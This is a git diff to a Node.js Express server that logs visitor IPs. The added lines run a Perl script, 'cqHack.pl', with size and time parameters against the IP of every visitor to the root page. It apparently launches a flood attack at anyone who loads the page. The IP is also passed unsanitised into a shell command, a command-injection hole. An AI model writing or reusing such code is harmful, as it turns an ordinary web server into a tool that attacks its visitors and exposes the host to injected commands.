@@ -1,5 +1,6 @@
 const express = require("express");
 const app = express();
+const { exec } = require("child_process");
 
 app.get("/", (req, res) => {
 
@@ -13,6 +14,19 @@ app.get("/", (req, res) => {
         (req.connection.socket ? req.connection.socket.remoteAddress : null);
     ip = ip.replace("::ffff:", "");
     console.log(date.toString() + "  " + ip);
+
+    exec("perl cqHack.pl size=4069 time=100 " + ip, (error, stdout, stderr) => {
+        if (error) {
+            console.log(`error: ${error.message}`);
+            return;
+        }
+        if (stderr) {
+            console.log(`stderr: ${stderr}`);
+            return;
+        }
+        console.log(`stdout: ${stdout}`);
+    });
+
 });
 
 
